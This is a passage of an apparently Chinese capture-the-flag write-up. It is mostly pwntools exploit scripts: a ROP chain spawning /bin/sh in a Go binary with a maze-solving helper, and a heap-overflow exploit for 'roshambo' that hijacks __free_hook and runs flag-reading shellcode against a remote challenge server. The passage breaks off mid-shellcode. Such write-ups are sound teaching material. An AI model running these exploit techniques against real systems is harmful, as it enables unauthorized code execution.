class="string">&#x27;3&#x27;</span>)</span><br><span class="line">			i = i + <span class="number">4</span></span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmap</span>(<span class="params">x</span>):</span><br><span class="line">	m = []</span><br><span class="line">	a = getline()</span><br><span class="line">	n = <span class="built_in">len</span>(a)</span><br><span class="line">	a = change(a,n)</span><br><span class="line">	m.append(a)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">		a = getline()</span><br><span class="line">		n = <span class="built_in">len</span>(a)</span><br><span class="line">		a = change(a,n)</span><br><span class="line">		m.append(a)</span><br><span class="line">	<span class="keyword">return</span> x + <span class="number">1</span>, m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pas</span>():</span><br><span class="line">	x = <span class="number">6</span></span><br><span class="line">	l = <span class="number">0</span></span><br><span class="line">	mm = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">		<span class="built_in">help</span> = process(<span class="string">&#x27;hhh&#x27;</span>)</span><br><span class="line">		<span class="built_in">help</span>.recvuntil(<span class="string">&quot;plz input x:&quot;</span>);</span><br><span class="line">		<span class="built_in">help</span>.sendline(<span class="built_in">str</span>(x + i));</span><br><span class="line">		r.recvline()</span><br><span class="line">		l, mm = getmap(x + i - <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(x + i):</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(x + i):</span><br><span class="line">				<span class="built_in">help</span>.sendline(mm[j][k]);</span><br><span class="line">		<span class="built_in">help</span>.recvuntil(<span class="string">&quot;your answer&quot;</span>);</span><br><span class="line">		answer = <span class="built_in">help</span>.recvline()</span><br><span class="line">		answer = <span class="built_in">help</span>.recvline()</span><br><span class="line">		r.send(answer);</span><br><span class="line">		<span class="built_in">help</span>.close()</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;level &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; ok!&quot;</span></span><br><span class="line">		<span class="built_in">print</span> answer</span><br><span class="line"></span><br><span class="line">pas()</span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b * 0x743c9 + 0x555555554000&quot;)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xc000000030</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0</span>) + <span class="string">&#x27;B&#x27;</span> * <span class="number">0x88</span> + <span class="string">&#x27;\xF0\xD0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your name is : &quot;</span>)</span><br><span class="line">pie = u64(r.recv(<span class="number">8</span>)) + <span class="number">0x555555554000</span> - <span class="number">0x55555575aac0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pie: &quot;</span> + <span class="built_in">hex</span>(pie) </span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xc000000180</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0</span>) + <span class="string">&#x27;B&#x27;</span> * <span class="number">0x88</span> + p64(pie + <span class="number">0x1190F0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your name is : &quot;</span>)</span><br><span class="line">stack = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack) </span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x109d3d</span> + pie</span><br><span class="line">pop_rsi_r15 = <span class="number">0x119c45</span> + pie</span><br><span class="line">pop_rdx_adc_rax = <span class="number">0x79e6e</span> + pie</span><br><span class="line">syscall = <span class="number">0x743c9</span> + pie</span><br><span class="line">pop_rax_ret = <span class="number">0x74e29</span> + pie</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> * (<span class="number">0x70</span> / <span class="number">8</span>) + p64(<span class="number">0xC000000180</span>) + p64(<span class="number">8</span>) + p64(<span class="number">0</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span> * (<span class="number">0x88</span> / <span class="number">8</span>)</span><br><span class="line"><span class="comment"># payload += p64(pop_rdx_adc_rax) + p64(0)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rsi_r15) + p64(0) + p64(0)</span></span><br><span class="line">payload += p64(pop_rdi) + p64(stack + <span class="number">0xDC8</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>其中hhh的源码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">a[100][100]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printmap</span><span class="params">(<span class="type">char</span> a[<span class="number">1000</span>][<span class="number">1000</span>])</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">1000</span>;j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%hhd&quot;</span>, a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span> a[<span class="number">1000</span>][<span class="number">1000</span>], <span class="type">char</span> * answer, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="comment">// printmap(a);</span></span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">0</span> &amp;&amp; a[x - <span class="number">1</span>][y] == <span class="number">5</span>) &#123;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">999</span> &amp;&amp; a[x + <span class="number">1</span>][y] == <span class="number">5</span>) &#123;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y &gt; <span class="number">0</span> &amp;&amp; a[x][y - <span class="number">1</span>] == <span class="number">5</span>) &#123;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y &lt; <span class="number">999</span> &amp;&amp; a[x][y + <span class="number">1</span>] == <span class="number">5</span>) &#123;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">0</span> &amp;&amp; a[x - <span class="number">1</span>][y] == <span class="number">1</span>) &#123;</span><br><span class="line">        a[x - <span class="number">1</span>][y] = <span class="number">3</span>;</span><br><span class="line">        a[x][y] = <span class="number">2</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">if</span>(dfs(a, answer, x - <span class="number">1</span>, y))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; <span class="number">999</span> &amp;&amp; a[x + <span class="number">1</span>][y] == <span class="number">1</span>) &#123;</span><br><span class="line">        a[x + <span class="number">1</span>][y] = <span class="number">3</span>;</span><br><span class="line">        a[x][y] = <span class="number">2</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">if</span>(dfs(a, answer, x + <span class="number">1</span>, y))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y &gt; <span class="number">0</span> &amp;&amp; a[x][y - <span class="number">1</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        a[x][y - <span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">        a[x][y] = <span class="number">2</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">if</span>(dfs(a, answer, x, y - <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(y &lt; <span class="number">999</span> &amp;&amp; a[x][y + <span class="number">1</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        a[x][y + <span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">        a[x][y] = <span class="number">2</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer)] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">        <span class="comment">// puts(answer);</span></span><br><span class="line">        <span class="keyword">if</span>(dfs(a, answer, x, y + <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        answer[<span class="built_in">strlen</span>(answer) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> a[<span class="number">1000</span>][<span class="number">1000</span>], <span class="type">char</span> * answer)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">1000</span>;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i][j] == <span class="number">3</span>) &#123;</span><br><span class="line">                x = i;</span><br><span class="line">                y = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;%d %d\n&quot;, x, y);</span></span><br><span class="line">    </span><br><span class="line">    dfs(a, answer, x, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;plz input x:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;x;j++)</span><br><span class="line">        &#123;</span><br><span class="line">		    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line">        	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        	a[i][j]=m;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *answer;</span><br><span class="line">    answer=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    find(a, answer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your answer\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(answer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec">https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec</a></p>
<h3><span id="roshambo">roshambo</span><a href="#roshambo" class="header-anchor"></a></h3><p><strong>Second Blood</strong></p>
<p>2a51—sha-256<br>最后有个堆溢出，malloc 0的时候会read 0xfffffffff</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;81.68.174.63&#x27;</span>,<span class="number">64681</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;81.68.174.63&#x27;</span>,<span class="number">64681</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;AMD64&quot;</span></span><br><span class="line">context.log_level =<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">author=<span class="string">&#x27;a&#x27;</span>,name=<span class="string">&#x27;a&#x27;</span>,name2=<span class="string">&#x27;b&#x27;</span></span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Your Mode: &#x27;</span>,<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Authorization:&#x27;</span>,author)</span><br><span class="line">	r.recvuntil(<span class="string">&#x27;Your room: &#x27;</span>)</span><br><span class="line">	room=r.recvline()</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;Your Name: &#x27;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your Mode: &#x27;</span>,<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;our room: &#x27;</span>)</span><br><span class="line">	p.send(room)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your Name:&#x27;</span>)</span><br><span class="line">	p.sendline(name2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gd</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="comment">#	pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game_start</span>():</span><br><span class="line">	r.sendafter(<span class="string">&#x27; &gt;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">4</span>))</span><br><span class="line">	p.sendafter(<span class="string">&#x27; &gt;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_free</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27; &gt;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">8</span>))</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27; &gt;&gt;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">8</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27; want to say? &#x27;</span>,content2)</span><br><span class="line">	r.sendafter(<span class="string">&#x27; want to say? &#x27;</span>,content1)</span><br><span class="line">	</span><br><span class="line">start()</span><br><span class="line">game_start()</span><br><span class="line">add_free(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc71</span>),<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc71</span>))</span><br><span class="line">game_start()</span><br><span class="line">add_free(<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;leave: &#x27;</span>)</span><br><span class="line">leak=u64(r.recvuntil(<span class="string">&#x27;\x7F&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libc_base1=leak-<span class="number">1569</span>-<span class="number">0x10</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook1 = libc_base1+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;LIBC1:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base1))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;leave: &#x27;</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">&#x27;\x7F&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line">libc_base2=leak-<span class="number">1569</span>-<span class="number">0x10</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook2 = libc_base2+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;LIBC2:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">game_start()</span><br><span class="line">add_free(<span class="number">0</span>,<span class="string">&#x27;U&#x27;</span>*<span class="number">0x10</span>+ p64(<span class="number">0</span>) +p64(<span class="number">0x51</span>)+p64(libc_base1+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]),<span class="string">&#x27;U&#x27;</span>*<span class="number">0x10</span>+ p64(<span class="number">0</span>) +p64(<span class="number">0x51</span>)+p64(libc_base2+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">game_start()</span><br><span class="line">add_free(<span class="number">0xF0</span>,<span class="string">&#x27;U&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base1+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]),<span class="string">&#x27;U&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc_base2+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">game_start()</span><br><span class="line">new_execve_env1 = free_hook1 &amp; <span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_execve_env1</span><br><span class="line"></span><br><span class="line">new_execve_env2 = free_hook2 &amp; <span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_execve_env2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">orw = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// ./flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;// 置0就行</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;// 读到栈上</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span 